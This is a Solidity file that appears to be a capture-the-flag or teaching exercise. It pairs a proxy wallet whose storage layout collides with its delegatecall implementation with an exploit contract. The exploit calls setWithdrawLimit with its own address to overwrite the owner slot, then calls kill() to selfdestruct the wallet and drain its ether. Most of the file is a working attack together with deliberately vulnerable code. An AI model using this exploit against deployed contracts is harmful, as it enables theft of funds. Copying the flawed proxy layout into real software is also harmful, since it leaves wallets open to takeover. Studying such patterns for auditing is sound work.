// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IBurnerWallet {
    function setWithdrawLimit(uint limit) external;

    function kill() external;
}

contract BurnerWalletExploit {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function pwn() external {
        // set owner to this contract
        // since BurnerWallet doesn't have function "setWithdrawLimit"
        // it will go into fallback() in BurnerWallet
        IBurnerWallet(target).setWithdrawLimit(uint(uint160(address(this))));
        // kill to drain wallet
        IBurnerWallet(target).kill();
    }
}

contract BurnerWallet {
    // take notice of order here!!!
    address public implementation;
    address payable public owner;

    constructor(address _implementation) {
        implementation = _implementation;
        owner = payable(msg.sender);
    }

    fallback() external payable {
        (bool executed, ) = implementation.delegatecall(msg.data);
        require(executed, "failed");
    }

    function kill() external {
        require(msg.sender == owner, "not owner");
        selfdestruct(owner);
    }
}

contract BurnerWalletImplementation {
    // take notice of order here!!! change limit in BurnerWalletImplementation == change owner in BurnerWallet
    address public implementation;
    uint public limit;
    address payable public owner;

    receive() external payable {}

    modifier onlyOwner() {
        require(msg.sender == owner, "!owner");
        _;
    }

    function setWithdrawLimit(uint _limit) external {
        limit = _limit;
    }

    function withdraw() external onlyOwner {
        uint amount = address(this).balance;
        if (amount > limit) {
            amount = limit;
        }
        owner.transfer(amount);
    }
}
